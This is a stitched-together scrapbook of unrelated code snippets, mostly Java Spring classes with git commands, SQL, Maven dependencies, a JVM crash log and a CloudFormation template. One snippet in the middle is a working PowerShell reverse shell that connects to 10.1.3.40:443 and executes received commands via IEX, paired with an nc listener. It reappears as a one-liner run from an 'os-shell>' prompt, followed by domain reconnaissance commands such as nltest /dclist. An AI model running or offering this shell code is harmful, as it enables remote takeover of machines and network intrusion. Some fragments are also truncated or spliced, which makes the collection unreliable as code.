        System.arraycopy(values, 1, back, 0, back.length);
        return back;
    }

    public static long[] prepare(long... values) {
        Arrays.sort(values);
        long[] back = new long[values.length - 2];
        System.arraycopy(values, 1, back, 0, back.length);
        return back;
    }

    public static float[] prepare(float... values) {
        Arrays.sort(values);
        float[] back = new float[values.length - 2];
        System.arraycopy(values, 1, back, 0, back.length);
        return back;
    }

    public static long binomialCoefficients(int n, int k) {

        long Ank = 1;

        if (k < 0 || k > n) {
            return 0;
        }

        long i = n - k + 1;
        while (i <= n && Ank >= 0) {
            Ank = Ank * i;
            i = i + 1;
        }
        if (Ank < 0) return Integer.MAX_VALUE;
        return Ank;
    }

}
----------------------------------------------------------------------------------------
import org.springframework.validation.Errors;
import org.springframework.validation.ValidationUtils;
import org.springframework.validation.Validator;

import br.com.casadocodigo.loja.models.Produto;

public class ProdutoValidation implements Validator {

    @Override
    public boolean supports(Class<?> clazz) {
        return Produto.class.isAssignableFrom(clazz);
    }

    @Override
    public void validate(Object target, Errors errors) {
        ValidationUtils.rejectIfEmpty(errors, "titulo", "field.required");
        ValidationUtils.rejectIfEmpty(errors, "descricao", "field.required");
        
        Produto produto = (Produto) target;
        if(produto.getPaginas() <= 0) {
            errors.rejectValue("paginas", "field.required");
        }
    }
}
----------------------------------------------------------------------------------------
import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.boot.web.servlet.support.SpringBootServletInitializer;

public class ServletInitializer extends SpringBootServletInitializer {

	@Override
	protected SpringApplicationBuilder configure(SpringApplicationBuilder application) {
		return application.sources(RouteprojectApplication.class);
	}

}

----------------------------------------------------------------------------------------
# initialize project for submodules usage
git submodule init

# add submodule
git submodule add https://github.com/OleksandrKucherenko/autoproxy.git modules/autoproxy

# update project recursively and pull all submodules
git submodule update --init --recursive

git submodule update --init
# if there are nested submodules:
git submodule update --init --recursive

# download up to 8 submodules at once
git submodule update --init --recursive --jobs 8
git clone --recursive --jobs 8 [URL to Git repo]
# short version
git submodule update --init --recursive -j 8

# pull all changes in the repo including changes in the submodules
git pull --recurse-submodules

# pull all changes for the submodules
git submodule update --remote

git submodule foreach 'git reset --hard'
# including nested submodules
git submodule foreach --recursive 'git reset --hard'


git submodule deinit -f — mymodule

rm -rf .git/modules/mymodule

git rm -f mymodule
----------------------------------------------------------------------------------------
/*
--jdbc:postgresql://localhost:5432/sampledb
--PostgreSQL Password for database superuser
--PostgreSQL Port
--5432
postgres
*********************
*/

DROP DATABASE IF EXISTS hibernatedb;

CREATE DATABASE hibernatedb;

-- \connect hibernatedb;

DROP TABLE IF EXISTS users;
CREATE TABLE users
(
    id SERIAL NOT NULL,
    username VARCHAR(50) NOT NULL, 
    login_date DATE NOT NULL DEFAULT CURRENT_DATE,
    login_time TIME NOT NULL DEFAULT CURRENT_TIME,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,    
    CONSTRAINT pk_id PRIMARY KEY(id),
    CONSTRAINT idx_username UNIQUE(username)    
);

SELECT * FROM users;

/*
INSERT INTO users(username, login_date, login_time, created_at, updated_at)
VALUES('Foo', '2016-11-06', '10:49:35', '2016-11-06 10:49:35.0', '2016-11-06 10:49:35.0');
SELECT * FROM users;
*/
----------------------------------------------------------------------------------------
<dependency>
	<groupId>com.github.wnameless.json</groupId>
	<artifactId>json-bean-populator</artifactId>
	<version>0.3.0</version>
</dependency>

<dependency>
    <groupId>io.github.graphql-java</groupId>
    <artifactId>graphql-java-annotations</artifactId>
    <version>7.2.1</version>
</dependency>
#
# A fatal error has been detected by the Java Runtime Environment:
#
#  EXCEPTION_ACCESS_VIOLATION (0xc0000005) at pc=0x0000000075e90940, pid=6788, tid=0x0000000000004358
#
# JRE version: Java(TM) SE Runtime Environment (8.0_221-b11) (build 1.8.0_221-b11)
# Java VM: Java HotSpot(TM) 64-Bit Server VM (25.221-b11 mixed mode windows-amd64 compressed oops)
# Problematic frame:
# V  [jvm.dll+0xb0940]
#
# Failed to write core dump. Minidumps are not enabled by default on client versions of Windows
#
# An error report file with more information is saved as:
# C:\Users\Alex\Documents\pem-message\common2\hs_err_pid6788.log
#
# If you would like to submit a bug report, please visit:
#   http://bugreport.java.com/bugreport/crash.jsp
#

Process finished with exit code 1
----------------------------------------------------------------------------------------
import com.xcar.model.DTO.BankslipDTO;
import com.xcar.model.DTO.BankslipListDTO;
import com.xcar.model.entity.Bankslip;
import org.mapstruct.Mapper;
import org.mapstruct.Mapping;
import org.mapstruct.Mappings;
import org.mapstruct.ReportingPolicy;

import java.util.List;

@Mapper(componentModel = "spring", unmappedTargetPolicy = ReportingPolicy.IGNORE)
public interface BankslipMapper {

    @Mappings({
            @Mapping(source = "id", target = "id"),
            @Mapping(source = "due_date", target = "due_date"),
            @Mapping(source = "total_in_cents", target = "total_in_cents"),
            @Mapping(source = "customer", target = "customer")
    })
    BankslipListDTO toListDto(Bankslip bankslip);
    List<BankslipListDTO> toListBankslipDTO(List<Bankslip> bankslips);

    /*@Mappings({
            @Mapping(source = "due_date", target = "due_date"),
            @Mapping(source = "total_in_cents", target = "total_in_cents"),
            @Mapping(source = "customer", target = "customer"),
            @Mapping(source = "status", target = "status")
    })
    BankslipDTO toDTO(Bankslip bankslip);
    List<BankslipDTO> toDTOlList(List<Bankslip> bankslips);*/

    @Mappings({
            @Mapping(source = "due_date", target = "due_date"),
            @Mapping(source = "total_in_cents", target = "total_in_cents"),
            @Mapping(source = "customer", target = "customer"),
            @Mapping(source = "status", target = "status"),
            @Mapping(target = "createdAt", source = ""),
            @Mapping(target = "fine", source = ""),
            @Mapping(target = "id", source = ""),
            @Mapping(target = "updatedAT", source = "")
    })
    Bankslip toEntity(BankslipDTO bankslipDTO);
}
----------------------------------------------------------------------------------------
protoc --java_out=. *.proto

option java_outer_classname = "PbDemoProto";

option optimize_for = SPEED;
option java_generic_services = true;

message MsgFields {

}

message Login_C2S {
    required int64 timestamp = 1;
}

message Login_S2C {
    required int64 timestamp = 1;
}

service LoginService {
    rpc login (Login_C2S) returns (Login_S2C);
}

----------------------------------------------------------------------------------------

    private static boolean isPowerOfTwo(int val) {
        return (val & -val) == val;
    }
----------------------------------------------------------------------------------------
/**
 * @author teaey(xiaofei.wxf)
 * @since 1.0.3
 */
public enum ApnsGateway {
    DEVELOPMENT("gateway.sandbox.push.apple.com", 2195),
    PRODUCTION("gateway.push.apple.com", 2195),
    RESTFUL_DEVELOPMENT("api.development.push.apple.com", 443),
    RESTFUL_PRODUCTION("api.push.apple.com", 443),
    RESTFUL_DEVELOPMENT_BAK("api.development.push.apple.com", 2197),
    RESTFUL_PRODUCTION_BAK("api.push.apple.com", 2197);
    private final String host;
    private final int port;

    ApnsGateway(String host, int port) {
        this.host = host;
        this.port = port;
    }

    public String host() {
        return this.host;
    }

    public int port() {
        return this.port;
    }
}
----------------------------------------------------------------------------------------
    @Bean
    public Config hazelcastConfig() {
        return new Config().setProperty("hazelcast.jmx", "true")
                           .addMapConfig(new MapConfig("spring-boot-admin-application-eventstore").setBackupCount(1)
                                                                                                  .setEvictionPolicy(
                                                                                                          EvictionPolicy.NONE))
                           .addListConfig(new ListConfig("spring-boot-admin-event-eventstore").setBackupCount(1)
                                                                                              .setMaxSize(1000));
    }
----------------------------------------------------------------------------------------
/**
 *  Welcome to your gulpfile!
 *  The gulp tasks are split into several files in the gulp directory
 *  because putting it all here was too long
 */

'use strict';

var gulp = require('gulp');
var wrench = require('wrench');

/**
 *  This will load all js or coffee files in the gulp directory
 *  in order to load all gulp tasks
 */
wrench.readdirSyncRecursive('./gulp').filter(function(file) {
  return (/\.(js|coffee)$/i).test(file);
}).map(function(file) {
  require('./gulp/' + file);
});


/**
 *  Default task clean temporaries directories and launch the
 *  main optimization build task
 */
gulp.task('default', ['clean'], function () {
  gulp.start('build');
});
----------------------------------------------------------------------------------------
#!/bin/bash
if [ $# -ne 3 ]
then
  echo "Usage: `basename $0` <lastName> <firstName> <birthday>"
  exit 1
fi

curl -i \
    -v \
    -S \
    -s \
    -H "Content-Type:application/json" \
    -H "Transfer-Encoding: chunked" \
    -X POST \
    -d "{ \"lastName\": \"$1\", \"firstName\":\"$2\", \"birthday\": \"$3\" }" \
    "http://127.0.0.1:9090/prototype/api/persons/create"

echo ""
echo ""
----------------------------------------------------------------------------------------
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.treeleafj.xdoc.filter.ClassFilter;

/**
 * Created by leaf on 2017/4/3 0003.
 */
public class SpringClassFilter implements ClassFilter {

    @Override
    public boolean filter(Class<?> classz) {
        if (classz.getAnnotation(RequestMapping.class) != null
                || classz.getAnnotation(Controller.class) != null
                || classz.getAnnotation(RestController.class) != null) {
            return true;
        }
        return false;
    }
}
----------------------------------------------------------------------------------------
import io.pebbletemplates.benchmark.model.Stock;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import org.openjdk.jmh.annotations.BenchmarkMode;
import org.openjdk.jmh.annotations.Fork;
import org.openjdk.jmh.annotations.Measurement;
import org.openjdk.jmh.annotations.Mode;
import org.openjdk.jmh.annotations.OutputTimeUnit;
import org.openjdk.jmh.annotations.Scope;
import org.openjdk.jmh.annotations.State;
import org.openjdk.jmh.annotations.Warmup;

@Fork(5)
@Warmup(iterations = 5, time = 1)
@Measurement(iterations = 10, time = 1)
@BenchmarkMode(Mode.Throughput)
@OutputTimeUnit(TimeUnit.SECONDS)
@State(Scope.Benchmark)
public class BaseBenchmark {

    protected Map<String, Object> getContext() {
        Map<String, Object> context = new HashMap<>();
        context.put("items", Stock.dummyItems());
        return context;
    }

}
----------------------------------------------------------------------------------------
    @Override
    protected Filter[] getServletFilters() {
        CharacterEncodingFilter encodingFilter = new CharacterEncodingFilter();
        encodingFilter.setEncoding("UTF-8");
        encodingFilter.setForceEncoding(true);

        return new Filter[] { encodingFilter };
    }

----------------------------------------------------------------------------------------
	private static class TokenInfoCondition extends SpringBootCondition {

		@Override
		public ConditionOutcome getMatchOutcome(ConditionContext context,
				AnnotatedTypeMetadata metadata) {
			ConditionMessage.Builder message = ConditionMessage
					.forCondition("OAuth TokenInfo Condition");
			Environment environment = context.getEnvironment();
			Boolean preferTokenInfo = environment.getProperty(
					"security.oauth2.resource.prefer-token-info", Boolean.class);
			if (preferTokenInfo == null) {
				preferTokenInfo = environment
						.resolvePlaceholders("${OAUTH2_RESOURCE_PREFERTOKENINFO:true}")
						.equals("true");
			}
			String tokenInfoUri = environment
					.getProperty("security.oauth2.resource.token-info-uri");
			String userInfoUri = environment
					.getProperty("security.oauth2.resource.user-info-uri");
			if (!StringUtils.hasLength(userInfoUri)
					&& !StringUtils.hasLength(tokenInfoUri)) {
				return ConditionOutcome
						.match(message.didNotFind("user-info-uri property").atAll());
			}
			if (StringUtils.hasLength(tokenInfoUri) && preferTokenInfo) {
				return ConditionOutcome
						.match(message.foundExactly("preferred token-info-uri property"));
			}
			return ConditionOutcome.noMatch(message.didNotFind("token info").atAll());
		}

	}
	
		private int countBeans(Class<?> type) {
		return BeanFactoryUtils.beanNamesForTypeIncludingAncestors(this.beanFactory, type,
				true, false).length;
	}
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
import demo.model.primary.PrimaryModel;
import demo.repository.primary.PrimaryRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.domain.Example;
import org.springframework.data.domain.ExampleMatcher;
import org.springframework.data.domain.Pageable;
import org.springframework.data.rest.webmvc.RepositoryRestController;
import org.springframework.data.web.PagedResourcesAssembler;
import org.springframework.hateoas.PagedResources;
import org.springframework.hateoas.Resource;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import static org.springframework.data.domain.ExampleMatcher.StringMatcher.CONTAINING;

@RestController
@RequestMapping("/${spring.data.rest.base-path}/primary")
@RepositoryRestController
public class PrimaryRestController {

	@Autowired
	private PrimaryRepository primaryRepository;

	@Autowired
	private PagedResourcesAssembler<PrimaryModel> pagedAssembler;

	@GetMapping
	public PagedResources<Resource<PrimaryModel>> getPrimary(Pageable pageable, PrimaryModel primaryModel) {
		ExampleMatcher exampleMatcher = ExampleMatcher.matching()
				.withMatcher("name", matcher -> matcher.stringMatcher(CONTAINING))
				.withIgnoreCase()
				.withIgnoreNullValues();
		Example<PrimaryModel> example = Example.of(primaryModel, exampleMatcher);
		return pagedAssembler.toResource(primaryRepository.findAll(example, pageable));
	}
}

	@PostMapping
	public String saveSecondary(@ModelAttribute @Valid SecondaryForm form, BindingResult result,
			RedirectAttributes redirectAttrs, Model model) {
		if (result.hasErrors()) {
			return "secondary";
		}
		SecondaryModel newSecondaryModel = repository.save(new SecondaryModelBuilder()
				.fromForm(form)
				.build());
		redirectAttrs.addFlashAttribute("success", newSecondaryModel);
		return "redirect:/secondary";
	}
	
mport demo.model.secondary.SecondaryModel;
import demo.repository.secondary.SecondaryRepository;
import org.hibernate.validator.HibernateValidator;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.mockito.Mock;
import org.mockito.runners.MockitoJUnitRunner;
import org.springframework.beans.factory.config.ConfigurableListableBeanFactory;
import org.springframework.validation.beanvalidation.LocalValidatorFactoryBean;
import org.springframework.web.context.support.AnnotationConfigWebApplicationContext;

import javax.validation.ConstraintViolation;
import java.util.Set;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.Matchers.eq;
import static org.mockito.Mockito.when;

@RunWith(MockitoJUnitRunner.class)
public class UniqueSecondaryTest {

	private LocalValidatorFactoryBean validator = new LocalValidatorFactoryBean();

	@Mock
	private SecondaryRepository secondaryRepository;

	@Before
	public void before() {
		AnnotationConfigWebApplicationContext context = new AnnotationConfigWebApplicationContext();
		context.refresh();

		ConfigurableListableBeanFactory beanFactory = context.getBeanFactory();
		beanFactory.registerSingleton(SecondaryRepository.class.getCanonicalName(), secondaryRepository);

		validator.setApplicationContext(context);
		validator.setProviderClass(HibernateValidator.class);
		validator.afterPropertiesSet();
	}

	@Test
	public void uniqueSecondaryModel() {
		SecondaryForm form = new SecondaryForm();
		form.setName("Test");

		when(secondaryRepository.findByNameIgnoreCase(eq(form.getName()))).thenReturn(null);

		Set<ConstraintViolation<SecondaryForm>> constraintViolations = validator.validate(form);
		assertThat(constraintViolations).isEmpty();
	}

	@Test
	public void nonUniqueSecondaryModel() {
		SecondaryForm form = new SecondaryForm();
		form.setName("Test");

		when(secondaryRepository.findByNameIgnoreCase(eq(form.getName()))).thenReturn(new SecondaryModel());

		Set<ConstraintViolation<SecondaryForm>> constraintViolations = validator.validate(form);
		assertThat(constraintViolations).hasSize(1);
	}

}

import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.servlet.MockMvc;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.model;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.view;

@RunWith(SpringRunner.class)
@WebMvcTest(DemoController.class)
public class DemoControllerTest {

	@Autowired
	private MockMvc mockMvc;
	
	@Test
	public void getHome() throws Exception {
		mockMvc.perform(get("/"))
				.andExpect(status().isOk())
				.andExpect(model().attributeExists("sbVersion"))
				.andExpect(view().name("home"));
	}

}
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
echo kern.maxfiles=65536 | sudo tee -a /etc/sysctl.conf
echo kern.maxfilesperproc=65536 | sudo tee -a /etc/sysctl.conf
sudo sysctl -w kern.maxfiles=65536
sudo sysctl -w kern.maxfilesperproc=65536
ulimit -n 65536 65536

https://www.templatemonster.com/shopify-themes.php?aff=TM&gclid=Cj0KCQiAxfzvBRCZARIsAGA7YMyEnm2OzWRrZIJ1dlav26VDdhjPFcjcOsUzF0AiQcZcvdbNlYkBCqYaAu5QEALw_wcB
https://colorlib.com/wp/free-best-shopify-themes/
https://themeforest.net/category/ecommerce/shopify
https://webdesign.tutsplus.com/articles/20-best-shopify-themes-with-beautiful-ecommerce-designs--cms-26547
https://business.tutsplus.com/articles/best-shopify-themes--cms-30306

----------------------------------------------------------------------------------------
go get -u github.com/Shopify/themekit
----------------------------------------------------------------------------------------
nc -lp 443

$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (IEX $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()};
$client.Close()"

os-shell> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

echo (Get-WmiObject Win32_ComputerSystem).Name
server2012

echo $env:userdomain
mydomain

cmd /c "nltest /dclist:mydomain"
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
import java.nio.ByteBuffer;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Random;
import java.util.stream.Collectors;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

import com.google.common.io.BaseEncoding;

import ch.rasc.eds.starter.Application;

public class TotpAuthUtil {

	public static boolean verifyCode(String secret, int code, int variance) {
		long timeIndex = System.currentTimeMillis() / 1000 / 30;
		byte[] secretBytes = BaseEncoding.base32().decode(secret);
		for (int i = -variance; i <= variance; i++) {
			if (getCode(secretBytes, timeIndex + i) == code) {
				return true;
			}
		}
		return false;
	}

	public static long getCode(byte[] secret, long timeIndex) {
		try {
			SecretKeySpec signKey = new SecretKeySpec(secret, "HmacSHA1");
			ByteBuffer buffer = ByteBuffer.allocate(8);
			buffer.putLong(timeIndex);
			byte[] timeBytes = buffer.array();
			Mac mac = Mac.getInstance("HmacSHA1");
			mac.init(signKey);
			byte[] hash = mac.doFinal(timeBytes);
			int offset = hash[19] & 0xf;
			long truncatedHash = hash[offset] & 0x7f;
			for (int i = 1; i < 4; i++) {
				truncatedHash <<= 8;
				truncatedHash |= hash[offset + i] & 0xff;
			}
			return truncatedHash %= 1000000;
		}
		catch (InvalidKeyException | NoSuchAlgorithmException | IllegalStateException e) {
			Application.logger.error("getCode", e);
			return 0;
		}
	}

	public static String randomSecret() {
		String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
		return new Random().ints(16, 0, 32).mapToObj(i -> String.valueOf(chars.charAt(i)))
				.collect(Collectors.joining());
	}
}

@ApiIgnore


import org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Import;
import org.springframework.web.servlet.config.annotation.ViewControllerRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;
import org.thymeleaf.templateresolver.UrlTemplateResolver;

@Configuration 
@Import({ControllerConfiguration.class})
public class ApplicationConfiguration extends WebMvcConfigurerAdapter {
	
	/**
	 * This bean gets picked up automatically by {@link ThymeleafAutoConfiguration}.
	 */
	@Bean
	public UrlTemplateResolver urlTemplateResolver(){
		UrlTemplateResolver urlTemplateResolver = new UrlTemplateResolver();
		urlTemplateResolver.setOrder(20);
		return urlTemplateResolver;
	}
	
	@Override
	public void addViewControllers(ViewControllerRegistry registry) {
		super.addViewControllers(registry);
		registry.addViewController("/").setViewName("redirect:/movies");
	}
	
}
----------------------------------------------------------------------------------------
import org.apache.activemq.artemis.api.core.ActiveMQIllegalStateException;
import org.jboss.logging.Messages;
import org.jboss.logging.annotations.Cause;
import org.jboss.logging.annotations.Message;
import org.jboss.logging.annotations.MessageBundle;

/**
 * Logger Code 20
 *
 * each message id must be 6 digits long starting with 20, the 3rd digit should be 9
 *
 * so 209000 to 209999
 */
@MessageBundle(projectCode = "AMQ")
public interface ActiveMQUtilBundle {

   ActiveMQUtilBundle BUNDLE = Messages.getBundle(ActiveMQUtilBundle.class);

   @Message(id = 209000, value = "invalid property: {0}", format = Message.Format.MESSAGE_FORMAT)
   ActiveMQIllegalStateException invalidProperty(String part);

   @Message(id = 209001, value = "Invalid type: {0}", format = Message.Format.MESSAGE_FORMAT)
   IllegalStateException invalidType(Byte type);

   @Message(id = 209002, value = "the specified string is too long ({0})", format = Message.Format.MESSAGE_FORMAT)
   IllegalStateException stringTooLong(Integer length);

   @Message(id = 209003, value = "Error instantiating codec {0}", format = Message.Format.MESSAGE_FORMAT)
   IllegalArgumentException errorCreatingCodec(@Cause Exception e, String codecClassName);

   @Message(id = 209004, value = "Failed to parse long value from {0}", format = Message.Format.MESSAGE_FORMAT)
   IllegalArgumentException failedToParseLong(String value);
}
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
---
AWSTemplateFormatVersion: '2010-09-09'
Description:
  Global configuration that could be used by multiple related stacks
   
# Metadata: # no metadata
 
Parameters:
  Environment:
    Type: String
    Description:
      Stack Environment Prefix.
       
Resources:
  # We need at least one resource. The VPC is the logical one to include here.
  VPC:
    Type: AWS::EC2::VPC
    Properties:
      # The range of ip addresses used in the VPC. Subnets will be inside this.
      # Using the /16 lets me easily have subnets that don't overlap without
      # needing to remember bit masks.
      CidrBlock: 10.0.0.0/16  # 10.0.0.0 -> 10.0.255.255
      EnableDnsSupport: true  # If false, the servers don't seem to get access to DNS at all.
      InstanceTenancy: default
      Tags:
        - Key: Name
          Value: !Sub "${Environment} VPC"
   
Outputs:
  VPC:
    Description: The ID for the Virtual Private Cloud; needed by more or less everything.
    Value: !Ref VPC
    Export:
      Name: !Sub "${Environment}::VPC"
----------------------------------------------------------------------------------------
	/**
	 * Retrieves a list of CompanyInfor objects. Given the name parameters, the
	 * return list will contain objects that match the search both on company
	 * name as well as symbol.
	 * 
	 * @param name
	 *            The search parameter for company name or symbol.
	 * @return The list of company information.
	 */
	@HystrixCommand(fallbackMethod = "getCompanyInfoFallback",
		    commandProperties = {
		      @HystrixProperty(name="execution.timeout.enabled", value="false")
		    })
	public List<CompanyInfo> getCompanyInfo(String name) {
		logger.debug("QuoteService.getCompanyInfo: retrieving info for: "
				+ name);
		Map<String, String> params = new HashMap<String, String>();
		params.put("name", name);
		CompanyInfo[] companies = restTemplate.getForObject(company_url,
				CompanyInfo[].class, params);
		logger.debug("QuoteService.getCompanyInfo: retrieved info: "
				+ companies);
		return Arrays.asList(companies);
	}
----------------------------------------------------------------------------------------
@Entity
public class Tree {

	@OneToMany
	private Set<Node> nodes = new HashSet<>();

	public NestedSet<Node> asNestedSet() {
		return new NestedSet<Node>(nodes);
	}

	public Node getRootComponent() {
		return asNestedSet().getRoot();
	}
}

@Entity
public class Node implements NestedSetElement {
	@ManyToOne
	@JoinColumn
	private Tree tree;

	@Embedded
	private NestedSetBound bound = new NestedSetBound();

	@Override
	public NestedSetBound getBound() {
		return bound;
	}

	@Override
	public void setBound(NestedSetBound bound) {
		this.bound = bound;
	}

	public Node getParent() {
		return tree.asNestedSet().getParentOf(this);
	}

	public final List<Node> getChildren() {
		return tree.asNestedSet().getChildrenOf(this);
	}
}
-----------------------------------------------------------------------------------------
  public static String joinPath(String... paths) {
    StringBuilder sb = new StringBuilder();
    for (int i = 0; i < paths.length; i++) {
      if (i > 0) {
        sb.append("/");
      }
      if (paths[i].endsWith("/")) {
        sb.append(paths[i].substring(0, paths[i].length() - 1));
      } else {
        sb.append(paths[i]);
      }
    }
    return sb.toString();
  }
-----------------------------------------------------------------------------------------
  @JsonFormat(pattern = "dd/MM/yyyy HH:mm")
  @DateTimeFormat(pattern = "dd/MM/yyyy")
  
  
      final URI uri =
        MvcUriComponentsBuilder.fromController(getClass())
            .path("/{id}")
            .buildAndExpand(person.getId())
            .toUri();
			
			
			import com.lankydan.entity.membership.GymMembership;
import com.lankydan.rest.person.PersonController;
import lombok.Getter;
import org.springframework.hateoas.Link;
import org.springframework.hateoas.ResourceSupport;

import static org.springframework.hateoas.mvc.ControllerLinkBuilder.linkTo;
import static org.springframework.hateoas.mvc.ControllerLinkBuilder.methodOn;

@Getter
public class GymMembershipResource extends ResourceSupport {

  private final GymMembership gymMembership;

  public GymMembershipResource(final GymMembership gymMembership) {
    this.gymMembership = gymMembership;
    final long membershipId = gymMembership.getId();
    final long personId = gymMembership.getOwner().getId();
    add(new Link(String.valueOf(membershipId), "membership-id"));
    add(linkTo(methodOn(GymMembershipController.class).all(personId)).withRel("memberships"));
    add(linkTo(methodOn(PersonController.class).get(personId)).withRel("owner"));
    add(linkTo(methodOn(GymMembershipController.class).get(personId, membershipId)).withSelfRel());
  }
}
-----------------------------------------------------------------------------------------
import com.lankydan.cassandra.Person;
import com.lankydan.cassandra.PersonKey;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.cassandra.core.CassandraOperations;
import org.springframework.data.cassandra.core.mapping.CassandraPersistentEntity;
import org.springframework.data.cassandra.repository.support.MappingCassandraEntityInformation;

@Configuration
public class KeyspaceBCassandraConfig {

  @Bean
  public KeyspaceBPersonRepository keyspaceBPersonRepository(
      final CassandraOperations cassandraTemplate,
      @Value("${cassandra.keyspace.b}") final String keyspace) {
    final CassandraPersistentEntity<Person> entity =
        (CassandraPersistentEntity<Person>)
            cassandraTemplate
                .getConverter()
                .getMappingContext()
                .getRequiredPersistentEntity(Person.class);
    final MappingCassandraEntityInformation<Person, PersonKey> entityInformation =
        new MappingCassandraEntityInformation<>(entity, cassandraTemplate.getConverter());
    return new KeyspaceBPersonRepositoryImpl(cassandraTemplate, entityInformation, keyspace);
